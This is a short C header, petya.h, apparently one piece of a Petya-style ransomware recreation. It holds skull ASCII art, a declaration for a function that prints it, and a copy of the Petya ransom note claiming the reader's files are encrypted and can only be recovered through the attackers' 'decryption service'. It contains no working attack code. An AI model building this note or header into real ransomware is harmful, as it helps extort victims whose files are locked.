// petya.h

#ifndef PETYA_H
#define PETYA_H

#include "types.h"
#include "hidden_store.h"

#define PETYA_ART \
"             uu$$$$$$$$$$$uu                   \n" \
"          uu$$$$$$$$$$$$$$$$$uu                \n" \
"         u$$$$$$$$$$$$$$$$$$$$$u               \n" \
"        u$$$$$$$$$$$$$$$$$$$$$$$u              \n" \
"       u$$$$$$$$$$$$$$$$$$$$$$$$$u             \n" \
"       u$$$$$$*   *$$$*   *$$$$$$u             \n" \
"       *$$$$*      u$u       $$$$*             \n" \
"        $$$u       u$u       u$$$              \n" \
"        $$$u      u$$$u      u$$$              \n" \
"         *$$$$uu$$$   $$$uu$$$$*               \n" \
"          *$$$$$$$*   *$$$$$$$*                \n" \
"            u$$$$$$$u$$$$$$$u                  \n" \
"             u$*$*$*$*$*$*$u                   \n" \
"  uuu        $$u$ $ $ $ $u$$       uuu         \n" \
"  u$$$$       $$$$$u$u$u$$$       u$$$$        \n" \
"  $$$$$uu      *$$$$$$$$$*     uu$$$$$$        \n" \
"u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$       \n" \
"$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*      \n" \
" ***      **$$$$$$$$$$$uu **$***               \n" \
"          uuuu **$$$$$$$$$$uuu                 \n" \
" u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$        \n" \
" $$$$$$$$$$****           **$$$$$$$$$$$*       \n" \
"   *$$$$$*                      **$$$$**       \n" \
"     $$$*                         $$$$*        "

#define RANSOM_MSG \
"Ooops, your important files are encrypted.\n" \
"\n" \
"If you see this text, then your files are no longer accessible,\n" \
"because they have been encrypted. Perhaps you are busy looking for a way to\n" \
"recover your files, but don't waste your time.\n" \
"Nobody can recover your file without our decryption service.\n"

void print_petya_art(void);

#endif